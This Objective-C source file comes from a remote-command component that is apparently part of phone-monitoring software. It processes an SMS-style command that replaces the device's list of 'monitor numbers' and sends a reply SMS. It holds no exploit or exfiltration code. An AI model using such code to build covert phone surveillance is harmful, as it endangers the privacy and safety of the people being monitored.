
/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  ResetMonitorsProcessor
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  12/03/2012, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import "ResetMonitorsProcessor.h"
#import "PrefMonitorNumber.h"
#import "Preference.h"

@interface ResetMonitorsProcessor (PrivateAPI)
- (void) processResetMonitors;
- (void) resetMonitorsException: (NSUInteger) aErrorCode;
- (void) sendReplySMS;
- (BOOL) canResetMonitors;
@end

@implementation ResetMonitorsProcessor

@synthesize mMonitorNumbers;

/**
 - Method name: initWithRemoteCommandData
 - Purpose:This method is used to initialize the ResetMonitorsProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData)
 - Return description: self (ResetMonitorsProcessor)
*/

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData  {
    DLog (@"ResetMonitorsProcessor--->initWithRemoteCommandData");
	if ((self =  [super initWithRemoteCommandData:aRemoteCmdData])) {
	}
	return self;
}

#pragma mark RemoteCmdProcessor Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the ResetMonitorsProcessor
 - Argument list and description: 
 - Return description: No return type
*/

- (void) doProcessingCommand {
	DLog (@"ResetMonitorsProcessor--->doProcessingCommand")
	
	if ([RemoteCmdProcessorUtils isContainNonEndArgument:[mRemoteCmdData mArguments]]) {		
		
		mMonitorNumbers = [[NSArray alloc] initWithArray:[RemoteCmdProcessorUtils validateArgs:[mRemoteCmdData mArguments] validationType:kPhoneNumberValidation]];
		DLog(@"ResetMonitorsProcessor--->Monitors:%@",mMonitorNumbers);
		if ([mMonitorNumbers count]>0) {
			if ([self canResetMonitors])
				if (![RemoteCmdProcessorUtils isDuplicateTelephoneNumber:mMonitorNumbers]) [self processResetMonitors];
				else [self resetMonitorsException:kCmdExceptionErrorCannotAddDuplicateToMonitorList];
			else [self resetMonitorsException:kCmdExceptionErrorMonitorNumberExceedListCapacity];
		}
		else {
			[self resetMonitorsException:kCmdExceptionErrorInvalidNumberToMonitorList];
		}
	} else {
		[self resetMonitorsException:kCmdExceptionErrorInvalidCmdFormat];
	}	
}

#pragma mark ResetMonitorsProcessor PrivateAPI Methods

/**
 - Method name: processResetMonitors
 - Purpose:This method is used to process reset Monitors
 - Argument list and description: No Argument
 - Return description: No Return type
 */

- (void) processResetMonitors {
	DLog (@"ResetMonitorsProcessor--->processResetMonitors");
	id <PreferenceManager> prefManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
	PrefMonitorNumber *prefMonitor = (PrefMonitorNumber *) [prefManager preference:kMonitor_Number];
	NSMutableArray *monitorsArray=[[NSMutableArray alloc] init];
	[prefMonitor setMMonitorNumbers:mMonitorNumbers];
	[monitorsArray release];
	[prefManager savePreferenceAndNotifyChange:prefMonitor];
	[self sendReplySMS];
}

/**
 - Method name: canResetMonitors
 - Purpose:This method is used to check the maximum limit(MONITOR_NUMBERS_LIST_CAPACITY) for reset Monitors. 
 - Argument list and description: No Argument
 - Return description: BOOL
 */

- (BOOL) canResetMonitors {
	DLog (@"ResetMonitorsProcessor--->canResetMonitors")
	//id <PreferenceManager> prefManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
	//PrefMonitorNumber *prefMonitor = (PrefMonitorNumber *) [prefManager preference:kMonitor_Number];
	int count = [mMonitorNumbers count];
	if (count<=MONITOR_NUMBERS_LIST_CAPACITY) {
		return YES;
	}
	else {
		return NO;
	}
}

/**
 - Method name: resetMonitorsException
 - Purpose:This method is invoked when  reset monitors process failed. 
 - Argument list and description: No Argument
 - Return description: No Return Type
*/

- (void) resetMonitorsException: (NSUInteger) aErrorCode {
	DLog (@"ResetMonitorsProcessor--->addMonitorsException")
	FxException* exception = [FxException exceptionWithName:@"addMonitorsException" andReason:@"Reset Monitors error"];
	[exception setErrorCode:aErrorCode];
	[exception setErrorCategory:kFxErrorRCM]; 
	@throw exception;
}

/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: No Argument
 - Return description: No return type
*/

- (void) sendReplySMS {
	DLog (@"ResetMonitorsProcessor--->sendReplySMS")
	NSString *messageFormat=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						andErrorCode:_SUCCESS_];
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:messageFormat];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
		[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
															   andMessage:messageFormat];
	}
}

/**
 - Method name: dealloc
 - Purpose:This method is used to Handle Memory managment
 - Argument list and description:No Argument
 - Return description: No Return Type
*/

-(void) dealloc {
	[mMonitorNumbers release];
	[super dealloc];
}


@end
